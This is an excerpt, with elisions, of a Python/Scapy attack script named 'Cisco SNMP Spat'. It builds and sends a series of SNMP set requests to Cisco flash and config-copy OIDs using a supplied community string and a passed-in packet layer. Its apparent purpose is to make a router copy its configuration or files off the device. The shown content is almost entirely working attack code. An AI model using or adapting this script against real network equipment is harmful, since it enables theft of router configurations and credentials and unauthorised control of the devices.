...
print "Cisco SNMP Spat, ", version
print "Muhammad Sarmad Shafiq, @digitalsurgn"
...
def sendSNMP( l, c ):
	s1=SNMP(community=c,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.10.1.2.3.1.2.969"),value=6)])) 
	s2=SNMP(community=c,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.10.1.2.3.1.7.969"),value=1)])) 
	s3=SNMP(community=c,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.10.1.2.3.1.4.969"),value=2)]))
	s4=SNMP(community=c,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.14.744"),value=6)])) 
	s5=SNMP(community=c,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.2.744"),value=1)])) 
	...
	send(l/s8, verbose=0)
	send(l/s9, verbose=0)
	send(l/s10, verbose=0)
	send(l/s11, verbose=0)
	send(l/s12, verbose=0)
def checkFile():
